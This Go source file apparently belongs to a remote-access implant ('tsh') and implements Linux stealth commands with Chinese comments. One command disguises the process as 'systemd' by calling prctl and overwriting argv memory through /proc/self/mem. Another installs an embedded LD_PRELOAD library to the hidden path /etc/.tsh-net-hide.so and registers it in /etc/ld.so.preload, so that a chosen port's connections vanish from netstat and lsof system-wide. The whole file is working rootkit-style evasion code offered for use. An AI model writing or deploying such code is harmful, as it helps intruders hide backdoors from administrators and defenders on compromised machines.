//go:build linux

package commands

import (
	"bytes"
	"embed"
	"errors"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

//go:embed hide_preload/so/*
var hideSoFS embed.FS

// 默认伪装进程名（hideprocess 不带参数时使用）
const defaultFakeName = "systemd"

// prctl 常量（Linux）
const prSetName = 15 // PR_SET_NAME

// CmdHideProcess 进程名隐藏：prctl(PR_SET_NAME) 修改 /proc/self/comm + 覆盖 argv 参数区内存
// 修改 /proc/self/cmdline（ps -ef / pgrep 显示为新名字）。
// cmdBuf: "名字"（可选，默认 systemd）；"off"/"restore"/"unhide" 恢复原始名称。
//
// 多次隐藏语义：原始状态（首次隐藏前的 comm 与完整参数区）只保存一次，
// 之后的隐藏仅更换显示名，off 始终恢复到最初的原始进程名（而非上一次伪装名）。
func CmdHideProcess(cmdBuf []byte) ([]byte, error) {
	arg := strings.TrimSpace(string(cmdBuf))

	// 恢复模式：还原 comm 与 argv 参数区（首次隐藏时保存的原始状态）
	if arg == "off" || arg == "restore" || arg == "unhide" {
		return restoreProcessName()
	}

	name := arg
	if name == "" {
		name = defaultFakeName
	}

	results := []string{}

	// 首次隐藏：捕获并保存原始状态（comm + 完整参数区地址与字节）。
	// 后续隐藏复用已保存的地址与区域长度——原 argv[0] 已被覆盖清零，
	// 重新扫描栈将找不到原文。
	hideStateMu.Lock()
	if !hideState.active {
		hideState.origComm = readSelfComm()
		if addr, area, err := captureArgArea(); err == nil {
			hideState.areaAddr = addr
			hideState.origArea = area
		} else {
			results = append(results, fmt.Sprintf("参数区捕获失败: %v", err))
		}
	}
	areaAddr := hideState.areaAddr
	area := hideState.origArea
	hideState.active = true
	hideStateMu.Unlock()

	// 1. prctl PR_SET_NAME：修改 /proc/self/comm（top/htop/ps -o comm 显示）。
	//    内核 TASK_COMM_LEN 限制 15 字符，超长由内核截断（无法避免）；
	//    完整名经 argv 槽位写入，cmdline/ps -ef 显示完整名。
	commName := name
	if len(commName) > 15 {
		commName = commName[:15]
	}
	commBytes := append([]byte(commName), 0)
	_, _, errno := syscall.Syscall6(syscall.SYS_PRCTL, prSetName,
		uintptr(unsafe.Pointer(&commBytes[0])), 0, 0, 0, 0)
	if errno != 0 {
		return nil, fmt.Errorf("prctl(PR_SET_NAME) 失败: %v", errno)
	}
	results = append(results, fmt.Sprintf("PR_SET_NAME -> %s", commName))

	// 2. 覆盖 argv 参数区：完整名写入槽位、其余清零（无 15 字符限制，
	//    /proc/self/cmdline 与 ps -ef 显示完整伪装名）
	if len(area) > 0 && areaAddr != 0 {
		buf := make([]byte, len(area))
		copy(buf, name)
		writeSelfMem(areaAddr, buf)
		results = append(results, fmt.Sprintf("argv 已覆盖 -> %s", name))
	} else {
		results = append(results, "argv 覆盖失败: 未捕获参数区")
	}

	return []byte(strings.Join(results, " | ")), nil
}

// hideState 隐藏前的原始状态（首次隐藏时保存，供 off 恢复）
var (
	hideStateMu sync.Mutex
	hideState   struct {
		active   bool
		origComm string // 首次隐藏前的 comm
		origArea []byte // 首次隐藏前的完整参数区字节（argv[0] + 后续参数）
		areaAddr uint64 // 参数区起始地址（arg_start）
	}
)

// readSelfComm 读取当前进程 comm（/proc/self/comm）
func readSelfComm() string {
	data, err := os.ReadFile("/proc/self/comm")
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

// restoreProcessName 恢复原始进程名与完整参数（comm + argv 参数区）
func restoreProcessName() ([]byte, error) {
	hideStateMu.Lock()
	active := hideState.active
	origComm := hideState.origComm
	origArea := hideState.origArea
	areaAddr := hideState.areaAddr
	hideState.active = false // 无论成败，一次恢复后状态即失效
	hideStateMu.Unlock()

	if !active {
		return nil, errors.New("当前未隐藏进程名，无可恢复状态（hideprocess 后才可 off）")
	}

	results := []string{}

	// 恢复整个参数区（argv[0] + 后续参数）：向原地址写回首次隐藏前保存的完整字节
	if len(origArea) > 0 && areaAddr != 0 {
		writeSelfMem(areaAddr, origArea)
		results = append(results, "命令行已完整恢复")
	} else {
		results = append(results, "参数区无可恢复状态(未覆盖)")
	}

	// 恢复 comm
	if origComm != "" {
		nameBytes := append([]byte(origComm), 0)
		_, _, errno := syscall.Syscall6(syscall.SYS_PRCTL, prSetName,
			uintptr(unsafe.Pointer(&nameBytes[0])), 0, 0, 0, 0)
		if errno != 0 {
			results = append(results, fmt.Sprintf("comm 恢复失败: %v", errno))
		} else {
			results = append(results, fmt.Sprintf("PR_SET_NAME 已恢复 -> %s", origComm))
		}
	}

	return []byte(strings.Join(results, " | ")), nil
}

// spoofArgv 在初始栈内存中定位 argv[0] 原文并覆盖：新名字写入 argv[0] 槽位，
// 参数区其余部分（argv[1..N]）清零，/proc/self/cmdline 仅显示伪装名。
// 布局：内核把 argv/envp 字符串放在主线程栈顶（高地址），
// /proc/self/cmdline 直接读取该内存区域。
// 返回：参数区起始地址 + 整个参数区原始字节（供 off/restore 完整还原）。
// 仅首次隐藏调用；后续隐藏复用已保存的地址与区域（原 argv[0] 已被覆盖，无法再扫描）。
func captureArgArea() (addr uint64, area []byte, err error) {
	// 读取 /proc/self/maps 找 [stack]
	mapsData, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return 0, nil, err
	}
	var stackStart, stackEnd uint64
	for _, line := range strings.Split(string(mapsData), "\n") {
		if !strings.HasSuffix(line, "[stack]") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		rangeParts := strings.SplitN(fields[0], "-", 2)
		if len(rangeParts) != 2 {
			continue
		}
		stackStart, _ = strconv.ParseUint(rangeParts[0], 16, 64)
		stackEnd, _ = strconv.ParseUint(rangeParts[1], 16, 64)
		break
	}
	if stackStart == 0 || stackEnd <= stackStart {
		return 0, nil, errors.New("未找到 [stack] 映射")
	}

	// 当前 argv[0] 原文
	orig := os.Args[0]
	if orig == "" {
		return 0, nil, errors.New("os.Args[0] 为空")
	}

	// 初始栈布局（高→低）：argc/argv指针/envp/auxv 数组，其下为字符串区，
	// argv[0] 位于字符串区最低地址（即 arg_start，/proc/self/cmdline 从此读取）。
	// 因此从低地址向高地址扫描，首个匹配即 argv[0] 原文。
	needle := []byte(orig)
	const chunkSize = 1 << 20 // 1MB 分块，避免一次性读取超大栈

	var foundAddr uint64
	found := false
	start := stackStart
	for start < stackEnd && !found {
		hi := stackEnd
		if start+chunkSize < hi {
			hi = start + chunkSize
		}
		region, err := readSelfMem(start, hi)
		if err != nil {
			return 0, nil, err
		}
		if idx := bytes.Index(region, needle); idx >= 0 {
			foundAddr = start + uint64(idx)
			found = true
		}
		start = hi
	}
	if !found {
		return 0, nil, errors.New("在栈内存中未找到 argv[0] 原文")
	}

	// 保存整个参数区原始字节（argv[0] + 后续参数 + 各自 NUL 结尾），供 off 完整还原。
	// /proc/self/cmdline 即 arg_start..arg_end 内存内容，长度 = 参数区总字节数；
	// foundAddr == arg_start（argv[0] 字符串起始）。
	cmdlineRaw, err := os.ReadFile("/proc/self/cmdline")
	if err != nil || len(cmdlineRaw) == 0 {
		return 0, nil, errors.New("读取 /proc/self/cmdline 失败")
	}

	return foundAddr, cmdlineRaw, nil
}

// readSelfMem 通过 /proc/self/mem 读取自身内存区域
func readSelfMem(lo, hi uint64) ([]byte, error) {
	mem, err := os.Open("/proc/self/mem")
	if err != nil {
		return nil, err
	}
	defer mem.Close()

	buf := make([]byte, int(hi-lo))
	n, err := mem.ReadAt(buf, int64(lo))
	if err != nil && n == 0 {
		return nil, err
	}
	return buf[:n], nil
}

// writeSelfMem 通过 /proc/self/mem 写入自身内存区域
func writeSelfMem(addr uint64, data []byte) {
	mem, err := os.OpenFile("/proc/self/mem", os.O_WRONLY, 0)
	if err != nil {
		return
	}
	defer mem.Close()
	mem.WriteAt(data, int64(addr))
}

// ============ 网络连接隐藏（LD_PRELOAD） ============

// hideSoFiles 内嵌的预编译隐藏库（hide_preload/so/hide_net_linux_<arch>.so）
func hideSoFiles() (map[string][]byte, error) {
	entries, err := hideSoFS.ReadDir("hide_preload/so")
	if err != nil {
		return nil, err
	}
	files := make(map[string][]byte)
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		data, err := hideSoFS.ReadFile("hide_preload/so/" + e.Name())
		if err != nil {
			continue
		}
		files[e.Name()] = data
	}
	return files, nil
}

const hideSoInstallPath = "/etc/.tsh-net-hide.so"
const hidePortPlaceholder = "HIDEPORT00000000"

// CmdHideNet 网络连接隐藏：
//   - "on <port>"：patch 端口到预编译 LD_PRELOAD 库 → 安装到 /etc/.tsh-net-hide.so →
//     追加到 /etc/ld.so.preload（需 root）。此后所有动态链接进程读取
//     /proc/net/tcp{,6}/udp{,6} 时过滤该端口连接（netstat/lsof/cat 不可见）。
//   - "off"：从 /etc/ld.so.preload 移除并删除库。
//
// 限制：ss 走 netlink、静态链接程序不受影响（用户态过滤边界）。
func CmdHideNet(cmdBuf []byte) ([]byte, error) {
	parts := strings.Fields(strings.TrimSpace(string(cmdBuf)))
	if len(parts) == 0 {
		parts = []string{"on"}
	}

	switch parts[0] {
	case "off", "remove":
		return hideNetOff()
	case "on", "install":
		if len(parts) < 2 {
			return nil, errors.New("请指定要隐藏的端口: hidenet on <port>")
		}
		port, err := strconv.Atoi(parts[1])
		if err != nil || port <= 0 || port > 65535 {
			return nil, fmt.Errorf("无效端口: %s（1-65535）", parts[1])
		}
		return hideNetOn(port)
	default:
		return nil, fmt.Errorf("未知参数: %s（on <port> | off）", parts[0])
	}
}

func hideNetOn(port int) ([]byte, error) {
	if os.Geteuid() != 0 {
		return nil, errors.New("网络连接隐藏需要 root 权限（写入 /etc/ld.so.preload）")
	}

	// 选择当前架构对应的预编译库
	soName := "hide_net_linux_" + runtime.GOARCH + ".so"
	files, err := hideSoFiles()
	if err != nil {
		return nil, err
	}
	soData, ok := files[soName]
	if !ok {
		return nil, fmt.Errorf("当前架构 %s 暂无预编译隐藏库（可用: %v）", runtime.GOARCH, availableSoNames(files))
	}

	// patch 端口占位符（替换全部副本；8 位 hex 右对齐，如 443 -> 000001BB）
	portHex := fmt.Sprintf("%08X", port)
	patched := bytes.ReplaceAll(soData, []byte(hidePortPlaceholder), []byte("HIDEPORT"+portHex))
	if bytes.Contains(patched, []byte(hidePortPlaceholder)) {
		return nil, errors.New("隐藏库中未找到端口占位符")
	}

	// 安装库文件（0644）
	if err := os.WriteFile(hideSoInstallPath, patched, 0644); err != nil {
		return nil, fmt.Errorf("写入 %s 失败: %v", hideSoInstallPath, err)
	}

	// 追加到 /etc/ld.so.preload（幂等：已存在则跳过）
	const preloadPath = "/etc/ld.so.preload"
	existing, _ := os.ReadFile(preloadPath)
	for _, line := range strings.Split(string(existing), "\n") {
		if strings.TrimSpace(line) == hideSoInstallPath {
			return []byte(fmt.Sprintf("网络连接隐藏已启用：端口 %d（库已安装）", port)), nil
		}
	}
	content := strings.TrimSpace(string(existing))
	if content != "" {
		content += "\n"
	}
	content += hideSoInstallPath + "\n"
	if err := os.WriteFile(preloadPath, []byte(content), 0644); err != nil {
		return nil, fmt.Errorf("写入 %s 失败: %v", preloadPath, err)
	}

	return []byte(fmt.Sprintf("网络连接隐藏已启用：端口 %d（%s，经 /etc/ld.so.preload 全局生效）", port, hideSoInstallPath)), nil
}

func hideNetOff() ([]byte, error) {
	if os.Geteuid() != 0 {
		return nil, errors.New("移除网络连接隐藏需要 root 权限")
	}
	const preloadPath = "/etc/ld.so.preload"
	existing, err := os.ReadFile(preloadPath)
	if err == nil {
		lines := strings.Split(string(existing), "\n")
		filtered := make([]string, 0, len(lines))
		for _, line := range lines {
			if strings.TrimSpace(line) != hideSoInstallPath {
				filtered = append(filtered, line)
			}
		}
		os.WriteFile(preloadPath, []byte(strings.Join(filtered, "\n")), 0644)
	}
	os.Remove(hideSoInstallPath)
	return []byte("网络连接隐藏已关闭（/etc/ld.so.preload 已清理）"), nil
}

func availableSoNames(files map[string][]byte) []string {
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	return names
}
